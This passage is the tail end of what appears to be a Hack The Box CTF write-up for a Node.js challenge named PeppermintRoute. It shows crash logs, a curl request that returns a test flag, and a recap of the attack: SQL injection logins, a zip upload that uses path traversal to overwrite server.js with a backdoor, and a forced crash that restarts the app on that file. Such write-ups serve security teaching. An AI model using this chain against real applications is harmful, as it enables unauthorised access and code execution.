+peppermintroute  |       ^
+peppermintroute  | 
+peppermintroute  | Error: ENOENT: no such file or directory, open '/app/data/uploads/8ccd74061453c353e39585205590835e/empty/'
+peppermintroute  | Emitted 'error' event on ReadStream instance at:
+peppermintroute  |     at emitErrorNT (node:internal/streams/destroy:170:8)
+peppermintroute  |     at emitErrorCloseNT (node:internal/streams/destroy:129:3)
+peppermintroute  |     at process.processTicksAndRejections (node:internal/process/task_queues:89:21) {
+peppermintroute  |   errno: -2,
+peppermintroute  |   code: 'ENOENT',
+peppermintroute  |   syscall: 'open',
+peppermintroute  |   path: '/app/data/uploads/8ccd74061453c353e39585205590835e/empty/'
+peppermintroute  | }
+peppermintroute  | 
+peppermintroute  | Node.js v24.12.0
+peppermintroute  | 2025-12-24 20:02:22,696 INFO exited: nodejs (exit status 1; not expected)
+peppermintroute  | 2025-12-24 20:02:22,696 INFO exited: nodejs (exit status 1; not expected)
+peppermintroute  | 2025-12-24 20:02:23,842 INFO spawned: 'nodejs' with pid 499
+peppermintroute  | 2025-12-24 20:02:23,842 INFO spawned: 'nodejs' with pid 499
+peppermintroute  | Warning: connect.session() MemoryStore is not
+peppermintroute  | designed for a production environment, as it will leak
+peppermintroute  | memory, and will not scale past a single process.
+peppermintroute  | [Server] PeppermintRoute running on http://127.0.0.1:3000
+peppermintroute  | 2025-12-24 20:02:34,222 INFO success: nodejs entered RUNNING state, process has stayed up for &gt; than 10 seconds (startsecs)
+peppermintroute  | 2025-12-24 20:02:34,222 INFO success: nodejs entered RUNNING state, process has stayed up for &gt; than 10 seconds (startsecs)
+</code></pre>
+
+<p>If we visit a page that doesn't exist, our backdoor will trigger instead of the 404 template, giving us the flag :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[/]
+└─$ curl http://localhost:1337/not-exist      
+HTB{f4ke_fl4g_f0r_t3st1ng}
+</code></pre>
+
+<h4 id="solve-recap">Solve recap</h4>
+<ol>
+<li>Log into admin with the SQLi vulnerability</li>
+<li>Create and upload a zip archive with the <code>../../../server.js</code> backdoored file and the empty directory to the attachements of an existing package of choice</li>
+<li>Assign this package of choice to a pilot of choice</li>
+<li>Log into the pilot of choice's account using the same SQLi vulnerability</li>
+<li>Attempt to download the empty directory as an attachement file, triggering the NodeJS fatal error and restarting the app with our malicious <code>server.js</code> file</li>
+<li>Visit a non existing page to trigger the backdoor and get the flag</li>
+</ol>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-ruby.min.js"></script>
+</body>
+</html>
